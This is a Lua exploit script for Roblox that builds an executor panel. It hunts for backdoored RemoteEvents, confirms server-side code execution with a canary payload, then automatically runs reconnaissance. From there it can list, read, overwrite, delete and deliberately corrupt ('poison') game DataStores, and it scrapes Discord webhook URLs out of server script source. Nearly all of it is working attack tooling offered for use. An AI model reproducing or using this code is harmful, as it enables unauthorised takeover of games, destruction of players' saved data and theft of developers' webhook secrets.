local Players = game:GetService("Players")
local RS      = game:GetService("ReplicatedStorage")
local UIS     = game:GetService("UserInputService")
local DSS     = game:GetService("DataStoreService")
local Http    = game:GetService("HttpService")
local LP      = Players.LocalPlayer

local T = { bg = Color3.fromRGB(30,30,33), head = Color3.fromRGB(38,38,42),
            panel = Color3.fromRGB(24,24,27), line = Color3.fromRGB(58,58,64),
            text = Color3.fromRGB(224,224,228), dim = Color3.fromRGB(128,128,136),
            accent = Color3.fromRGB(150,180,240), danger = Color3.fromRGB(226,96,96),
            ok = Color3.fromRGB(120,200,140) }

local function mk(c, p, parent)
    local o = Instance.new(c)
    for k, v in pairs(p or {}) do o[k] = v end
    if parent then o.Parent = parent end
    return o
end

local function ser(v, d)
    d = d or 0
    local tv = typeof(v)
    if tv == "string" then return ("%q"):format(v) end
    if tv == "table" then
        if d >= 2 then return "{...}" end
        local p, n = {}, 0
        for k, x in pairs(v) do
            n += 1
            if n > 20 then p[#p+1] = "..." break end
            p[#p+1] = ("%s = %s"):format(tostring(k), ser(x, d+1))
        end
        return "{" .. table.concat(p, ", ") .. "}"
    end
    return tostring(v)
end

local TOKEN = "SSP_" .. tostring(math.random(100000, 999999))
local OUT_NAME = "SSP_Out_" .. TOKEN

------------------------------------------------------------------
-- SERVER WRAPPER TEMPLATE
------------------------------------------------------------------
local TEMPLATE = [==[
local RS      = game:GetService("ReplicatedStorage")
local DSS     = game:GetService("DataStoreService")
local Players = game:GetService("Players")
local Http    = game:GetService("HttpService")

local PLR = Players:GetPlayerByUserId(__UID__)
local OUT = RS:FindFirstChild("__OUT__") or Instance.new("RemoteEvent", RS)
OUT.Name = "__OUT__"

local function emit(t, k)
    if PLR then OUT:FireClient(PLR, tostring(t), k or "out") end
end

local function ser(v, d)
    d = d or 0
    local tv = typeof(v)
    if tv == "string" then return ("%q"):format(v) end
    if tv == "table" then
        if d >= 2 then return "{...}" end
        local p, n = {}, 0
        for k, x in pairs(v) do
            n += 1
            if n > 20 then p[#p+1] = "..." break end
            p[#p+1] = ("%s = %s"):format(tostring(k), ser(x, d+1))
        end
        return "{" .. table.concat(p, ", ") .. "}"
    end
    return tostring(v)
end

local function store(n)
    local ok, d = pcall(function() return DSS:GetDataStore(n) end)
    return ok and d or nil
end
local function withStore(n, f)
    local d = store(n); if not d then return "no store: " .. tostring(n) end
    local ok, r = pcall(f, d)
    return ok and r or ("err: " .. tostring(r))
end

local ds = {
    keys = function(n, pre)
        return withStore(n, function(d)
            local p = d:ListKeysAsync(pre ~= "" and pre or nil, 50)
            local o = {}
            for _, k in ipairs(p:GetCurrentPage()) do o[#o+1] = k.KeyName end
            return o
        end)
    end,
    get = function(n, k) return withStore(n, function(d) return ser(d:GetAsync(k)) end) end,
    versions = function(n, k)
        return withStore(n, function(d)
            local p = d:ListVersionsAsync(k, Enum.SortDirection.Descending, nil, nil, 25)
            local o = {}
            for _, v in ipairs(p:GetCurrentPage()) do
                o[#o+1] = ("v%s @ %s"):format(v.Version,
                    os.date("%m-%d %H:%M", math.floor(v.CreatedTime/1000)))
            end
            return o
        end)
    end,
    restore = function(n, k, ver)
        return withStore(n, function(d)
            local v = d:GetVersionAsync(k, ver)
            if v == nil then return "version empty" end
            d:SetAsync(k, v); return "restored v" .. tostring(ver)
        end)
    end,
    set = function(n, k, v) return withStore(n, function(d) d:SetAsync(k, v); return "written" end) end,
    remove = function(n, k) return withStore(n, function(d) d:RemoveAsync(k); return "removed" end) end,
    poison = function(n, k, kind)
        return withStore(n, function(d)
            local v = kind == "instance" and workspace
                or kind == "nan" and { [0/0] = true }
                or kind == "oversize" and string.rep("A", 4200000)
                or "\255"
            d:SetAsync(k, v); return "poisoned: " .. tostring(kind or "utf8")
        end)
    end,
    stores = function()
        local out = {}
        for _, r in ipairs({game:GetService("ServerScriptService"),
                            game:GetService("ServerStorage"),
                            game:GetService("ReplicatedStorage")}) do
            for _, x in ipairs(r:GetDescendants()) do
                if x:IsA("LuaSourceContainer") then
                    local ok, src = pcall(function() return x.Source end)
                    if ok and src then
                        for m in src:gmatch('GetDataStore%(%s*["\']([^"\']+)["\']') do
                            out[m] = true
                        end
                    end
                end
            end
        end
        local l = {}
        for k in pairs(out) do l[#l+1] = k end
        return l
    end,
    webhooks = function()
        local out = {}
        for _, r in ipairs({game:GetService("ServerScriptService"),
                            game:GetService("ServerStorage"),
                            game:GetService("ReplicatedStorage")}) do
            for _, x in ipairs(r:GetDescendants()) do
                if x:IsA("LuaSourceContainer") then
                    local ok, src = pcall(function() return x.Source end)
                    if ok and src then
                        for m in src:gmatch("https://discord[%w%.]-/api/webhooks/%d+/[%w%-_]+") do
                            out[m] = true
                        end
                    end
                end
            end
        end
        local l = {}
        for k in pairs(out) do l[#l+1] = k end
        return l
    end,
}

local env = setmetatable({
    print = function(...)
        local p = {}
        for i = 1, select("#", ...) do p[i] = ser((select(i, ...))) end
        emit(table.concat(p, "  "), "out")
    end,
    warn = function(...)
        local p = {}
        for i = 1, select("#", ...) do p[i] = ser((select(i, ...))) end
        emit("warn: " .. table.concat(p, "  "), "warn")
    end,
    ds = ds,
}, { __index = getfenv() })

local SRC = __SRC__

local loader = rawget(getfenv(), "loadstring") or loadstring
if not loader then emit("no loadstring server-side", "err") return end
local fn, err = loader(SRC, "ssp")
if not fn then emit(err, "err") return end
setfenv(fn, env)
local ok, res = pcall(fn)
if not ok then emit(res, "err")
elseif res ~= nil then emit("=> " .. ser(res), "out") end
]==]

local function wrap(src)
    local s = TEMPLATE:gsub("__SRC__", function() return ("%q"):format(src) end)
    s = s:gsub("__UID__", tostring(LP.UserId))
    s = s:gsub("__OUT__", OUT_NAME)
    return s
end

------------------------------------------------------------------
-- SINK DISCOVERY
------------------------------------------------------------------
local SCORE = { loadstring = 10, runcode = 9, exec = 9, execute = 9, eval = 8,
                run = 7, script = 7, admin = 6, command = 6, cmd = 6,
                console = 5, music = 4, boombox = 4, song = 3 }

local function rank(n)
    local l = n:lower(); local s = 0
    for k, v in pairs(SCORE) do if l:find(k, 1, true) then s = math.max(s, v) end end
    return s
end

local SINK, SHAPE, MODE = nil, 1, "local"
local CANARY = "SSP_CANARY_" .. TOKEN

local function canarySrc()
    return ([[
local ok = pcall(function()
    game:GetService("DataStoreService"):GetDataStore("SSP_Probe"):GetAsync("x")
end)
local b = Instance.new("BoolValue")
b.Name = %q b.Value = ok b.Parent = workspace
]]):format(CANARY)
end

local SHAPES = {
    function(r, s)
        if r:IsA("RemoteEvent") then r:FireServer(s)
        else task.spawn(function() pcall(function() r:InvokeServer(s) end) end) end
    end,
    function(r, s)
        if r:IsA("RemoteEvent") then r:FireServer(TOKEN, s)
        else task.spawn(function() pcall(function() r:InvokeServer(TOKEN, s) end) end) end
    end,
    function(r, s)
        if r:IsA("RemoteEvent") then r:FireServer({ code = s })
        else task.spawn(function() pcall(function() r:InvokeServer({ code = s }) end) end) end
    end,
}

local function fire(src) if SINK then pcall(SHAPES[SHAPE], SINK, src) end end

------------------------------------------------------------------
-- GUI
------------------------------------------------------------------
local ROOT = (gethui and gethui()) or game:GetService("CoreGui")
local gui = mk("ScreenGui", { Name = "SSP", ResetOnSpawn = false,
    IgnoreGuiInset = true, ZIndexBehavior = Enum.ZIndexBehavior.Sibling }, ROOT)

local main = mk("Frame", { Parent = gui, Size = UDim2.fromOffset(560, 380),
    Position = UDim2.new(.5, -280, .5, -190), BackgroundColor3 = T.bg,
    BorderSizePixel = 1, BorderColor3 = T.line })

local bar = mk("Frame", { Parent = main, Size = UDim2.new(1, 0, 0, 24),
    BackgroundColor3 = T.head, BorderSizePixel = 0 })
mk("TextLabel", { Parent = bar, BackgroundTransparency = 1,
    Position = UDim2.fromOffset(8, 0), Size = UDim2.new(1, -170, 1, 0),
    Font = Enum.Font.SourceSans, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
    TextColor3 = T.text, Text = "Secret Service Panel by @MNF_YouTube" })

local pill = mk("TextButton", { Parent = bar, Size = UDim2.fromOffset(78, 16),
    Position = UDim2.new(1, -148, 0, 4), BackgroundColor3 = T.panel, BorderSizePixel = 1,
    BorderColor3 = T.line, Font = Enum.Font.Code, TextSize = 10,
    TextColor3 = T.danger, Text = "SCANNING" })

local function tb(txt, x, cb)
    local b = mk("TextButton", { Parent = bar, Size = UDim2.fromOffset(24, 18),
        Position = UDim2.new(1, x, 0, 3), BackgroundColor3 = T.head, BorderSizePixel = 0,
        Font = Enum.Font.SourceSans, TextSize = 12, TextColor3 = T.dim, Text = txt })
    b.MouseButton1Click:Connect(cb)
end
tb("\u{2013}", -52, function() main.Size = UDim2.fromOffset(560, main.Size.Y.Offset == 380 and 24 or 380) end)
tb("x", -28, function() gui:Destroy() end)

local drag, sp, so
bar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1
    or i.UserInputType == Enum.UserInputType.Touch then drag, sp, so = true, i.Position, main.Position end
end)
UIS.InputChanged:Connect(function(i)
    if drag and (i.UserInputType == Enum.UserInputType.MouseMovement
    or i.UserInputType == Enum.UserInputType.Touch) then
        local d = i.Position - sp
        main.Position = UDim2.new(so.X.Scale, so.X.Offset + d.X, so.Y.Scale, so.Y.Offset + d.Y)
    end
end)
UIS.InputEnded:Connect(function() drag = false end)

local heads = mk("Frame", { Parent = main, Position = UDim2.fromOffset(0, 24),
    Size = UDim2.new(1, 0, 0, 20), BackgroundColor3 = T.head, BorderSizePixel = 0 })
mk("TextLabel", { Parent = heads, BackgroundTransparency = 1, Position = UDim2.fromOffset(30, 0),
    Size = UDim2.new(.55, 0, 1, 0), Font = Enum.Font.SourceSans, TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center, TextColor3 = T.text, Text = "Executor" })
mk("TextLabel", { Parent = heads, BackgroundTransparency = 1, Position = UDim2.new(.55, 0, 0, 0),
    Size = UDim2.new(.45, 0, 1, 0), Font = Enum.Font.SourceSans, TextSize = 13,
    TextXAlignment = Enum.TextXAlignment.Center, TextColor3 = T.text, Text = "Console" })

local BUFFER = "SSP_buffer.lua"
local saved = ""
if readfile and isfile and isfile(BUFFER) then pcall(function() saved = readfile(BUFFER) end) end

local paneTop, paneH = 44, 300
local gutter = mk("TextLabel", { Parent = main, Position = UDim2.fromOffset(0, paneTop),
    Size = UDim2.fromOffset(28, paneH), BackgroundColor3 = T.panel, BorderSizePixel = 0,
    Font = Enum.Font.Code, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Right,
    TextYAlignment = Enum.TextYAlignment.Top, TextColor3 = T.dim, Text = "1" })

local input = mk("TextBox", { Parent = main, Position = UDim2.fromOffset(28, paneTop),
    Size = UDim2.new(.55, -28, 0, paneH), BackgroundColor3 = T.panel, BorderSizePixel = 0,
    Font = Enum.Font.Code, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
    TextYAlignment = Enum.TextYAlignment.Top, TextColor3 = T.text, MultiLine = true,
    ClearTextOnFocus = false, Text = saved, PlaceholderText = "print(ds.stores())",
    PlaceholderColor3 = T.dim })

local console = mk("ScrollingFrame", { Parent = main, Position = UDim2.new(.55, 0, 0, paneTop),
    Size = UDim2.new(.45, 0, 0, paneH), BackgroundColor3 = T.panel, BorderSizePixel = 0,
    CanvasSize = UDim2.new(), AutomaticCanvasSize = Enum.AutomaticSize.Y,
    ScrollBarThickness = 4, ScrollBarImageColor3 = T.line })
mk("UIListLayout", { Parent = console, Padding = UDim.new(0, 1) })

local function emit(text, kind)
    local col = kind == "err" and T.danger or kind == "ok" and T.ok
             or kind == "warn" and T.danger or kind == "dim" and T.dim or T.text
    mk("TextLabel", { Parent = console, BackgroundTransparency = 1,
        Size = UDim2.new(1, -8, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
        Position = UDim2.fromOffset(6, 0), Font = Enum.Font.Code, TextSize = 12,
        TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Left,
        TextColor3 = col, Text = tostring(text) })
    task.defer(function() console.CanvasPosition = Vector2.new(0, 1e6) end)
end

input:GetPropertyChangedSignal("Text"):Connect(function()
    local n = select(2, input.Text:gsub("\n", "\n"))
    local l = {}
    for i = 1, math.max(n + 1, 1) do l[i] = tostring(i) end
    gutter.Text = table.concat(l, "\n")
    if writefile then pcall(writefile, BUFFER, input.Text) end
end)

------------------------------------------------------------------
-- EXECUTION
------------------------------------------------------------------
local OUT
local function attachOut()
    OUT = RS:FindFirstChild(OUT_NAME)
    if not OUT then OUT = RS:WaitForChild(OUT_NAME, 4) end
    if OUT then
        OUT.OnClientEvent:Connect(function(txt, kind) emit(txt, kind) end)
    end
    return OUT ~= nil
end

local function runLocal(src)
    local env = setmetatable({
        print = function(...)
            local p = {}
            for i = 1, select("#", ...) do p[i] = ser((select(i, ...))) end
            emit(table.concat(p, "  "), "out")
        end,
        warn = function(...) emit("warn: " .. table.concat({...}, "  "), "warn") end,
        ds = setmetatable({}, { __index = function()
            return function() return "client — needs sink" end
        end }),
    }, { __index = getfenv() })
    local loader = rawget(getfenv(), "loadstring") or loadstring
    if not loader then emit("no loadstring", "err"); return end
    local fn, err = loader(src, "ssp")
    if not fn then emit(err, "err"); return end
    setfenv(fn, env)
    local ok, res = pcall(fn)
    if not ok then emit(res, "err") elseif res ~= nil then emit("=> " .. ser(res), "out") end
end

local function execute()
    local src = input.Text
    if src == "" then return end
    if MODE == "server" and SINK then
        fire(wrap(src))
    else
        emit("(local)", "dim")
        runLocal(src)
    end
end

------------------------------------------------------------------
-- RECON
------------------------------------------------------------------
local RECON = [==[
print("--- recon ---")
print("place", game.PlaceId, "players", #game:GetService("Players"):GetPlayers())
local st = ds.stores()
print("stores found:", #st)
for _, s in ipairs(st) do
    local ks = ds.keys(s, "")
    print(" ", s, type(ks) == "table" and (#ks .. " keys") or ks)
end
local wh = ds.webhooks()
print("webhooks:", #wh)
for _, w in ipairs(wh) do print(" ", w) end
]==]

------------------------------------------------------------------
-- BOOT
------------------------------------------------------------------
local cands = {}
for _, d in ipairs(RS:GetDescendants()) do
    if d:IsA("RemoteEvent") or d:IsA("RemoteFunction") then
        local s = rank(d.Name)
        if s > 0 then table.insert(cands, { inst = d, score = s }) end
    end
end
table.sort(cands, function(a, b) return a.score > b.score end)

task.spawn(function()
    emit("ssp loaded", "ok")
    emit(("%d ranked remotes"):format(#cands), "dim")
    for _, c in ipairs(cands) do
        for shape = 1, 3 do
            local b = workspace:FindFirstChild(CANARY)
            if b then b:Destroy() end
            SINK, SHAPE = c.inst, shape
            pcall(SHAPES[shape], c.inst, canarySrc())
            local t = 0
            while t < 0.7 do
                local v = workspace:FindFirstChild(CANARY)
                if v then
                    local real = v.Value
                    v:Destroy()
                    if real then
                        MODE = "server"
                        pill.Text = "SERVER"
                        pill.TextColor3 = T.ok
                        emit("server context: " .. c.inst:GetFullName(), "ok")
                        if attachOut() then
                            emit("--- recon ---", "dim")
                            fire(wrap(RECON))
                        end
                        return
                    end
                end
                task.wait(0.1); t += 0.1
            end
        end
    end
    SINK = nil
    MODE = "local"
    pill.Text = "LOCAL"
    pill.TextColor3 = T.dim
    emit("no sink — local mode, ds.* unavailable", "err")
end)

local footY = paneTop + paneH
local function foot(txt, x, w, cb, col)
    local b = mk("TextButton", { Parent = main, Position = UDim2.new(x, 0, 0, footY),
        Size = UDim2.new(w, -6, 0, 28), BackgroundColor3 = T.head, BorderSizePixel = 1,
        BorderColor3 = T.line, Font = Enum.Font.SourceSans, TextSize = 13,
        TextColor3 = col or T.text, Text = txt })
    b.MouseButton1Click:Connect(cb)
end
foot("Execute", 0, .333, execute)
foot("Execute & Console", .333, .333, execute, T.accent)
foot("Clear", .666, .334, function()
    for _, c in ipairs(console:GetChildren()) do
        if c:IsA("TextLabel") then c:Destroy() end
    end
end, T.dim)

input.InputBegan:Connect(function(i)
    if i.KeyCode == Enum.KeyCode.Return
    and (UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl)) then
        execute()
    end
end)
